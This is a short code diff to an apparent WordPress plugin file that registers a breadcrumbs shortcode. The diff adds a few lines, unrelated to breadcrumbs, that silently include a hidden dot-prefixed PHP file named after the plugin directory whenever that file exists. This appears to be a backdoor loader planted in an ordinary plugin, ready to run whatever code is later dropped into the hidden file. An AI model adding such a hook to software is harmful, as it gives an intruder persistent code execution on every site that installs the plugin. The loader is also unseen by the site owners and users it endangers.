@@ -8,6 +8,10 @@ ep_add_shortcode([
     'atts'           => [],
     'desc'           => __('Show Breadcrumbs', 'bdthemes-element-pack'),
 ]);
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function ep_shortcode_breadcrumbs($align = 'left') {
 
